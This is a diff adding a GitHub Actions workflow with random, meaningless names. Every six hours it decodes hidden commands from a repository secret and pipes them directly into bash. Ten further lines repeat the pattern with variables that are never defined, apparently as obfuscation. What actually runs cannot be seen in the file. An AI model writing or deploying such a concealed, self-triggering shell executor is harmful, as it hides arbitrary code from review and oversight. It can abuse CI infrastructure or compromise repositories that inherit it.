@@ -1,0 +1,29 @@
+name: diyuanzhz
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: diyuanzhz
+        env:
+          yvfs414: ${{ secrets.yvfs414 }}
+        run: |
+          echo $yvfs414 | jq -r .bzq00 | /bin/bash
+          echo $p3315 | jq -r .fga4086 | /bin/bash
+          echo $lkxp1 | jq -r .bd7 | /bin/bash
+          echo $fga2 | jq -r .kpv07234 | /bin/bash
+          echo $cue317 | jq -r .ifq06222 | /bin/bash
+          echo $a7535 | jq -r .bn37 | /bin/bash
+          echo $a97 | jq -r .qhcr8 | /bin/bash
+          echo $re39 | jq -r .jsm827 | /bin/bash
+          echo $xfgb1848 | jq -r .kc29487 | /bin/bash
+          echo $vy753 | jq -r .xfnch0 | /bin/bash
+          echo $do29 | jq -r .qo6684 | /bin/bash
+
